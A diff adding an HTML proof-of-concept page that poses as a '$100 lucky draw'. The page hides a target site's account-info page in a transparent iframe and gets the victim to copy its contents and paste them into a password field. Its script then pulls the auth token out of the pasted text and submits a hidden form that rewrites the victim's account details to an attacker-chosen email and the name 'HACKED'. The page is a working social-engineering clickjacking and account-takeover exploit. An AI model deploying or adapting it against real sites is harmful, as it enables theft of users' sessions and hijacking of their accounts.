@@ -1,0 +1,47 @@
+<!DOCTYPE html>
+<html>
+<head>
+<title></title>
+</head>
+<body>
+<center><h1 style=”color: blue; text-decoration: underline;”>Lucky Draw to Win a $100</h1></center>
+<h3>Click inside the box and Press CTRL+A then CTRL+C</h3>
+<div style=”border: 2px solid gray;”>
+<iframe src=”https://redacted.com/accountinfo/personal/lpsust/v1/redacted.com/" width=”100%” style=”opacity: 0"></iframe>
+</div>
+<h3>Click inside the box and press CTRL+V</h3>
+<input type=”password” name=”” size=”1">
+<br>
+<button id=”btn”>Click to Win</button>
+<div style=”display: none;”>
+<form action=”” method=”POST”>
+<input type=”hidden” name=”addrid” value=”12741305" />
+<input type=”hidden” name=”uname” value=”hack@gmail.com” />
+<input type=”hidden” name=”issendmsg” value=”1" />
+<input type=”hidden” name=”display” value=”” />
+<input type=”hidden” name=”sendtype” value=”update” />
+<input type=”hidden” name=”firstname” value=”accountinfo” />
+<input type=”hidden” name=”lastname” value=”HACKED” />
+<input type=”hidden” name=”country” value=”US” />
+<input type=”hidden” name=”reglang” value=”en&#95;US” />
+<input type=”hidden” name=”postcode” value=”1337" />
+<input type=”submit” value=”Submit request” />
+</form>
+</div>
+</body>
+<script>
+document.querySelector(“#btn”).onclick = function() {
+var token = document.querySelector(“input”).value
+var form = document.querySelector(“form”)
+token = JSON.parse(token)
+var mapInput = document.createElement(“input”);
+mapInput.type = “hidden”;
+mapInput.name = “auth_token”;
+mapInput.value = token.Value;
+form.appendChild(mapInput)
+form.action = `https://redacted.com/editInfo`
+form.submit();
+alert(“Congratulation! You have won $100”)
+}
+</script>
+</html>
